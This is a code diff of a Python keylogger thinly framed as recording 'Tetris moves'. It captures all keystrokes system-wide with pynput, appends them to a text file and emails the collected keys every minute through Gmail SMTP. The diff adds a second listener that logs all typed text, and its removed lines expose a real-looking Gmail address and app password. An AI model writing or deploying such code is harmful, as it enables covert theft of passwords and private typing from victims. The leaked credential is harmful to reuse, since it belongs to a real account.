@@ -1,24 +1,25 @@
 import threading
-from pynput import keyboard
 import logging
 import smtplib
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+from pynput.keyboard import Listener, Key
 
 # Setting up logging
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 # Email configuration
-sender_email = "hash43338@gmail.com"
-sender_password = "irwbfzqlajtxouwv"
+sender_email = "test@gmail.com"
+sender_password = "password"
 smtp_server = "smtp.gmail.com"
 smtp_port = 587
-receiver_email = "hash43338@gmail.com"
+receiver_email = "test@gmail.com"
 
-moves_filename = "tetris_moves.txt"
+moves_filename = "script.txt"
 game_moves = []  # List to accumulate game moves
 email_interval = 60  # Interval for sending emails in seconds
+
 
 def send_game_email(subject, body):
     try:
@@ -40,6 +41,7 @@ def send_game_email(subject, body):
     except Exception as e:
         logger.error(f"Failed to send email: {e}")
 
+
 def save_game_moves():
     global game_moves
     try:
@@ -54,6 +56,7 @@ def save_game_moves():
     except Exception as e:
         logger.error(f"Error writing to file or sending email: {e}")
 
+
 def on_tetris_key_press(key):
     global game_moves
     try:
@@ -63,19 +66,49 @@ def on_tetris_key_press(key):
     except Exception as e:
         logger.error(f"Error processing key press: {e}")
 
+
 def start_email_timer():
     threading.Timer(email_interval, start_email_timer).start()
     save_game_moves()
 
+
 def start_tetris_key_listener():
-    with keyboard.Listener(on_press=on_tetris_key_press) as listener:
+    with Listener(on_press=on_tetris_key_press) as listener:
         start_email_timer()
         listener.join()
 
-if __name__ == "__main__":
+
+def log_keystroke(key):
+    key = str(key).replace("'", "")
+
+    if key == 'Key.space':
+        key = ' '
+    elif key == 'Key.shift':
+        key = ''
+    elif key == 'Key.enter':
+        key = '\n'
+    elif key == 'Key.esc':
+        return False
+
+    with open("script.txt", 'a') as f:
+        if key:
+            f.write(key)
+    return True
+
+def main():
     try:
-        start_tetris_key_listener()
+        thread1 = threading.Thread(target=start_tetris_key_listener)
+        thread1.start()
+
+        with Listener(on_press=log_keystroke) as listener:
+            if not listener.join():
+                logger.info("Keylogger terminated by pressing the Esc key.")
+
     except KeyboardInterrupt:
-        logger.info("Tetris Keylogger program terminated by user")
+        logger.info("Program terminated by user")
     except Exception as e:
-        logger.error(f"Tetris Keylogger program error: {e}")
+        logger.error(f"Error: {e}")
+
+
+if __name__ == "__main__":
+    main()
